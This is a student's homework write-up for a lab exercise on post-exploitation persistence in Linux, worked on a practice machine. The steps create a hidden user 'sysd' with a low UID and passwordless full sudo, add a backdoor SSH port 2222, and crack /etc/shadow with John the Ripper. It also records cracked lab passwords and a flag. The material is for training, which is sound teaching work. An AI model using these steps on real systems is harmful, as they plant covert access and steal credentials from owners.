David Cornish - Homework Unit 6
Step 1: Shadow People
Create a secret user named sysd. Make sure this user doesn't have a home folder created:


adduser sysd --no-create-home
(assign password, leave name and additional info blank)
Give your secret user a password:


Surprise! The password = password (this is part of the adduser step above, must be entered twice to verify) 
Give your secret user a system UID < 1000:


usermod -u 666 sysd
Give your secret user the same GID:


groupmod -g 666 sysd
id sysd (verifies the changes above were made)
Give your secret user full sudo access without the need for a password:


visudo (go to the bottom of the script and add user with the following:) 
sysd ALL=(ALL:ALL) NOPASSWD:ALL
Test that sudo access works without your password:
su sysd (no password was required so this was successful)
Logged in as user sysd run: sudo -l 
User sysd may run the following commands on scavenger-hunt: (ALL : ALL) NOPASSWD: ALL (this confirms sysd has sudo privileges)

 Your bash commands here:
sysd ALL=(ALL:ALL) NOPASSWD:ALL
Step 2: Smooth Sailing
Edit the sshd_config file:
	(still signed in as user sysd - must log back into root using sudo su) 
		cd /etc/ssh
		nano sshd_config
		add Port 2222 (see below in bash)
		netstat -tulpn | grep LISTEN (view current)
		

 Your bash commands here
Under #Port 22 input 
Port 2222 (make sure it is uncommented)


Step 3: Testing Your Configuration Update
Restart the SSH service:


Your solution command here
systemctl restart ssh
netstat -tulpn | grep LISTEN
Exit the root account:


Your solution command here
exit (in this case 2xâ€™s to returns to sysd)
SSH to the target machine using your sysd account and port 2222:


Your solution command here
ifconfig (shows active)
ssh sysd@192.168.6.105 -p 2222
iIfconfig (to confirm)
uptime (to confirm)
Use sudo to switch to the root user:


Your solution command here
sudo su 
Step 4: Crack All the Passwords
SSH back to the system using your sysd account and port 2222:


Your solution command here
ssh sysd@192.168.6.105 -p 2222
ifconfig (to confirm) 
Uptime (to confirm)
2.   Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:


Your solution command here
As root user: john /etc/shadow
Was able to log in to target box as sysadmin with sudo privileges using password: passw0rd and capture the flag: You found flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0

I tested the cracked passwords directly on the target machine as well which was successful: 
User login: stallman Password: computer
